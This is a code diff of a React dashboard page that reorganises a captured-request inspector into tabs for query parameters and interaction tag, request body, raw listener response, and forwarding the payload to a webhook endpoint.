@@ -1083,147 +1585,189 @@ export default function DashboardPage({ params }) {
                         </tbody>
                       </table>
                     </div>
-                  </section>
-
-                  {/* QUERY PARAMETERS */}
-                  {Object.keys(selectedRequest.query).length > 0 && (
-                    <section className={styles.dataCard}>
-                      <div className={styles.sectionHeader}>
-                        <Globe size={15} style={{ color: 'var(--color-primary)' }} />
-                        <h3 className={styles.sectionTitle}>Query Parameters ({Object.keys(selectedRequest.query).length})</h3>
-                      </div>
-                      <div style={{ overflowX: 'auto' }}>
-                        <table className={styles.headersTable}>
-                          <tbody>
-                            {Object.entries(selectedRequest.query).map(([key, val]) => (
-                              <tr key={key}>
-                                <td className={styles.headerKey} style={{ color: 'var(--text-secondary)' }}>{key}</td>
-                                <td className={styles.headerVal} style={{ fontFamily: 'monospace' }}>
-                                  {Array.isArray(val) ? val.join(', ') : String(val)}
-                                </td>
-                              </tr>
-                            ))}
-                          </tbody>
-                        </table>
-                      </div>
-                    </section>
                   )}
 
-                  {/* POST BODY CARD */}
-                  {selectedRequest.body && (
-                    <section className={styles.dataCard}>
-                      <div className={styles.sectionHeader}>
-                        <FileCode size={15} style={{ color: 'var(--color-primary)' }} />
-                        <h3 className={styles.sectionTitle}>Request Body ({selectedRequest.bodyType.toUpperCase()})</h3>
+                  {/* TAB CONTENT: PARAMS & TAG */}
+                  {activeInspectorTab === 'PARAMS' && (
+                    <div style={{ padding: '16px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                      {selectedRequest.tag && (
+                        <div>
+                          <h4 style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginBottom: '6px' }}>Parsed Interaction Tag</h4>
+                          <span className={styles.tagBadge} style={{ fontSize: '0.8rem', padding: '4px 10px' }}>
+                            <Tag size={12} />
+                            {selectedRequest.tag}
+                          </span>
+                        </div>
+                      )}
+
+                      <div>
+                        <h4 style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginBottom: '8px' }}>
+                          Query Parameters ({Object.keys(selectedRequest.query || {}).length})
+                        </h4>
+                        {Object.keys(selectedRequest.query || {}).length > 0 ? (
+                          <table className={styles.headersTable}>
+                            <tbody>
+                              {Object.entries(selectedRequest.query).map(([key, val]) => (
+                                <tr key={key}>
+                                  <td className={styles.headerKey} style={{ color: 'var(--text-secondary)' }}>{key}</td>
+                                  <td className={styles.headerVal} style={{ fontFamily: 'monospace' }}>
+                                    {Array.isArray(val) ? val.join(', ') : String(val)}
+                                  </td>
+                                </tr>
+                              ))}
+                            </tbody>
+                          </table>
+                        ) : (
+                          <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)' }}>No query parameters present in request.</p>
+                        )}
+                      </div>
+                    </div>
+                  )}
+
+                  {/* TAB CONTENT: BODY */}
+                  {activeInspectorTab === 'BODY' && (
+                    <div style={{ padding: '16px' }}>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
+                        <span style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', textTransform: 'uppercase' }}>
+                          Format: {selectedRequest.bodyType || 'unknown'}
+                        </span>
+                        {selectedRequest.body && (
+                          <button 
+                            onClick={() => handleCopy(selectedRequest.body, 'body')}
+                            className="btn-secondary"
+                            style={{ padding: '4px 10px', fontSize: '0.72rem' }}
+                          >
+                            {copiedText === 'body' ? <Check size={12} style={{ color: 'var(--color-success)' }} /> : <Copy size={12} />}
+                            <span>Copy Body</span>
+                          </button>
+                        )}
+                      </div>
+
+                      {selectedRequest.body ? (
+                        selectedRequest.bodyType === 'json' ? (
+                          <pre className={styles.bodyPre}>
+                            <code dangerouslySetInnerHTML={getHighlightedJson(selectedRequest.body)} />
+                          </pre>
+                        ) : (
+                          <pre className={styles.bodyPre} style={{ color: 'var(--text-main)' }}>
+                            <code>{selectedRequest.body}</code>
+                          </pre>
+                        )
+                      ) : (
+                        <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', padding: '20px 0' }}>Request body is empty.</p>
+                      )}
+                    </div>
+                  )}
+
+                  {/* TAB CONTENT: RESPONSE SENT */}
+                  {activeInspectorTab === 'RESPONSE' && (
+                    <div style={{ padding: '16px' }}>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
+                        <span style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
+                          HTTP/1.1 Response returned by listener to target server
+                        </span>
                         <button 
-                          onClick={() => handleCopy(selectedRequest.body, 'body')}
-                          className={styles.copyBtn}
-                          style={{ marginLeft: 'auto' }}
+                          onClick={() => handleCopy(formatRawHttpResponse(config), 'raw-resp')}
+                          className="btn-secondary"
+                          style={{ padding: '4px 10px', fontSize: '0.72rem' }}
                         >
-                          {copiedText === 'body' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
+                          {copiedText === 'raw-resp' ? <Check size={12} style={{ color: 'var(--color-success)' }} /> : <Copy size={12} />}
+                          <span>Copy Response</span>
                         </button>
                       </div>
-
-                      {selectedRequest.bodyType === 'json' ? (
-                        <pre className={styles.bodyPre}>
-                          <code dangerouslySetInnerHTML={getHighlightedJson(selectedRequest.body)} />
-                        </pre>
-                      ) : (
-                        <pre className={styles.bodyPre} style={{ color: 'var(--text-main)' }}>
-                          <code>{selectedRequest.body}</code>
-                        </pre>
-                      )}
-                    </section>
+                      <pre className={styles.rawHttpContainer}>
+                        <code>{formatRawHttpResponse(config)}</code>
+                      </pre>
+                    </div>
                   )}
 
-                  {/* REQUEST REPLAY / FORWARDING CARD */}
-                  <section className={styles.forwardSection}>
-                    <div className={styles.sectionHeader} style={{ borderBottom: 'none', paddingBottom: '0' }}>
-                      <Send size={15} style={{ color: 'var(--color-primary)' }} />
-                      <h3 className={styles.sectionTitle}>Replay / Forward Request</h3>
-                    </div>
-                    <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
-                      Forward this webhook payload to a local development endpoint (e.g. ngrok/localhost) or external server.
-                    </p>
-                    
-                    <form onSubmit={handleForwardRequest} className={styles.forwardForm}>
-                      <input 
-                        type="url" 
-                        required
-                        placeholder="http://localhost:3000/webhook or https://api.example.com/webhook"
-                        value={forwardTarget}
-                        onChange={(e) => setForwardTarget(e.target.value)}
-                        className={`input-field ${styles.forwardInput}`}
-                      />
-                      <button 
-                        type="submit" 
-                        disabled={forwardState === 'loading'}
-                        className="btn-primary"
-                        style={{ padding: '10px 18px', fontSize: '0.85rem' }}
-                      >
-                        {forwardState === 'loading' ? (
-                          <>
-                            <RefreshCw size={14} className="animate-spin" />
-                            Forwarding...
-                          </>
-                        ) : (
-                          <>
-                            <Play size={14} fill="currentColor" />
-                            Forward Request
-                          </>
-                        )}
-                      </button>
-                    </form>
+                  {/* TAB CONTENT: REPLAY / FORWARD */}
+                  {activeInspectorTab === 'FORWARD' && (
+                    <div style={{ padding: '20px' }}>
+                      <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '14px' }}>
+                        Forward this captured interaction payload to a local development endpoint (e.g. ngrok/localhost) or external webhook.
+                      </p>
+                      
+                      <form onSubmit={handleForwardRequest} className={styles.forwardForm}>
+                        <input 
+                          type="url" 
+                          required
+                          placeholder="http://localhost:3000/webhook or https://api.example.com/webhook"
+                          value={forwardTarget}
+                          onChange={(e) => setForwardTarget(e.target.value)}
+                          className={`input-field ${styles.forwardInput}`}
+                        />
+                        <button 
+                          type="submit" 
+                          disabled={forwardState === 'loading'}
+                          className="btn-primary"
+                          style={{ padding: '10px 18px', fontSize: '0.85rem' }}
+                        >
+                          {forwardState === 'loading' ? (
+                            <>
+                              <RefreshCw size={14} className="animate-spin" />
+                              Forwarding...
+                            </>
+                          ) : (
+                            <>
+                              <Play size={14} fill="currentColor" />
+                              Forward Request
+                            </>
+                          )}
+                        </button>
+                      </form>
 
-                    {forwardState !== 'idle' && forwardResult && (
-                      <div 
-                        className="animate-fade-in"
-                        style={{ 
-                          marginTop: '16px', 
-                          padding: '14px', 
-                          borderRadius: 'var(--radius-sm)', 
-                          border: '1px solid var(--border-light)',
-                          background: 'var(--bg-canvas)' 
-                        }}
-                      >
-                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
-                          <span style={{ fontSize: '0.78rem', fontWeight: '600', color: 'var(--text-main)' }}>
-                            Forward Result
-                          </span>
-                          <span className={`badge ${forwardState === 'success' ? 'badge-success' : 'badge-error'}`}>
-                            {forwardState === 'success' ? `HTTP ${forwardResult.status}` : 'Forward Failed'}
-                          </span>
-                        </div>
-
-                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', fontSize: '0.75rem', color: 'var(--text-secondary)', marginBottom: '8px' }}>
-                          <div>Latency: <strong style={{ color: 'var(--text-main)', fontFamily: 'monospace' }}>{forwardResult.durationMs} ms</strong></div>
-                        </div>
-
-                        {forwardResult.body && (
-                          <div style={{ marginTop: '8px' }}>
-                            <span style={{ fontSize: '0.7rem', fontWeight: '600', color: 'var(--text-secondary)' }}>Response Body:</span>
-                            <pre 
-                              style={{ 
-                                marginTop: '4px',
-                                padding: '10px', 
-                                borderRadius: 'var(--radius-xs)', 
-                                background: 'var(--bg-input)', 
-                                fontSize: '0.75rem', 
-                                fontFamily: 'monospace', 
-                                color: 'var(--text-main)',
-                                maxHeight: '150px',
-                                overflowY: 'auto',
-                                whiteSpace: 'pre-wrap',
-                                wordBreak: 'break-all'
-                              }}
-                            >
-                              {forwardResult.body}
-                            </pre>
+                      {forwardState !== 'idle' && forwardResult && (
+                        <div 
+                          className="animate-fade-in"
+                          style={{ 
+                            marginTop: '16px', 
+                            padding: '14px', 
+                            borderRadius: 'var(--radius-sm)', 
+                            border: '1px solid var(--border-light)',
+                            background: 'var(--bg-canvas)' 
+                          }}
+                        >
+                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
+                            <span style={{ fontSize: '0.78rem', fontWeight: '600', color: 'var(--text-main)' }}>
+                              Forward Result
+                            </span>
+                            <span className={`badge ${forwardState === 'success' ? 'badge-success' : 'badge-error'}`}>
+                              {forwardState === 'success' ? `HTTP ${forwardResult.status}` : 'Forward Failed'}
+                            </span>
                           </div>
-                        )}
-                      </div>
-                    )}
-                  </section>
+
+                          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', fontSize: '0.75rem', color: 'var(--text-secondary)', marginBottom: '8px' }}>
+                            <div>Latency: <strong style={{ color: 'var(--text-main)', fontFamily: 'monospace' }}>{forwardResult.durationMs} ms</strong></div>
+                          </div>
+
+                          {forwardResult.body && (
+                            <div style={{ marginTop: '8px' }}>
+                              <span style={{ fontSize: '0.7rem', fontWeight: '600', color: 'var(--text-secondary)' }}>Response Body:</span>
+                              <pre 
+                                style={{ 
+                                  marginTop: '4px',
+                                  padding: '10px', 
+                                  borderRadius: 'var(--radius-xs)', 
+                                  background: 'var(--bg-input)', 
+                                  fontSize: '0.75rem', 
+                                  fontFamily: 'monospace', 
+                                  color: 'var(--text-main)',
+                                  maxHeight: '150px',
+                                  overflowY: 'auto',
+                                  whiteSpace: 'pre-wrap',
+                                  wordBreak: 'break-all'
+                                }}
+                              >
+                                {forwardResult.body}
+                              </pre>
+                            </div>
+                          )}
+                        </div>
+                      )}
+                    </div>
+                  )}
+
                 </div>
               </div>
             ) : null}
